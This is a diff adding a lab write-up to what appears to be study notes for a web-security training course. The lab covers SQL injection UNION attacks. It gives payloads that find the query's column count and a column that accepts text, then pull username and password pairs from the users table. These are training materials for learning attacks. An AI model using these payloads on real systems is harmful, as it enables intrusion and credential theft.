@@ -243,6 +243,69 @@ When the ORDER BY number exceeds the actual column count, an error will be shown
 
 > ✔️ Completed - Null-based UNION injection to identify correct column count.
 
+---
+
+<h3 align="center">🔍 Lab 4 - Finding a Column Containing Text Using SQL Injection</h3>
+
+<p align="center">
+  <b>Lab: SQL injection UNION attack to find a column that supports text</b><br>
+  <i>Target: Identify a column that supports string data to leak usernames and passwords.</i>
+</p>
+
+### 🧠 Lab Context
+
+> This lab has a SQL injection vulnerability in the product category filter.
+> 
+> Your mission is to:
+> 1. Find how many columns are returned by the query.
+> 2. Determine which column can handle string/text data types.
+> 3. Use UNION SELECT to inject and retrieve the admin username and password.
+
+---
+
+### 🎯 Goal
+
+✅ **Exploit SQLi using UNION SELECT to find a text-compatible column and retrieve string values.**
+
+---
+### 🛠️ Steps to Attack
+
+#### 1. 🔢 Determine Number of Columns
+
+You already learned this in the previous lab. For example, if the below payload gives no error:
+
+```http
+'+UNION+SELECT+NULL,NULL-- 
+```
+✅ Then the app has 2 columns in the query.
+
+### 2. 🧪 Test Columns for String Compatibility
+Now test which column can accept string data. Example payloads:
+```
+'+UNION+SELECT+'abc',NULL-- 
+'+UNION+SELECT+NULL,'abc'-- 
+```
+👉 When one of these payloads shows abc in the response (or no error), that column supports strings.
+
+### 🧩 Final Injection Payload
+After finding column count and which one supports strings, inject:
+```
+'+UNION+SELECT+NULL,username||'*'||password+FROM+users--
+```
+🟢 Example:
+```
+https://<LAB-ID>.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+NULL,username||'*'||password+FROM+users--
+|| is string concatenation (PostgreSQL-style)
+```
+This returns administrator*<password> if the second column supports text
+
+### 📌 Notes
+On MySQL: -- must be followed by a space or use # for comment.
+On Oracle: Use FROM DUAL if required.
+
+### ✅ Lab Status
+> ✔️ Completed - Successfully retrieved admin credentials by finding string-compatible column.
+
 ------
 ### 📚 Learning Takeaways
 
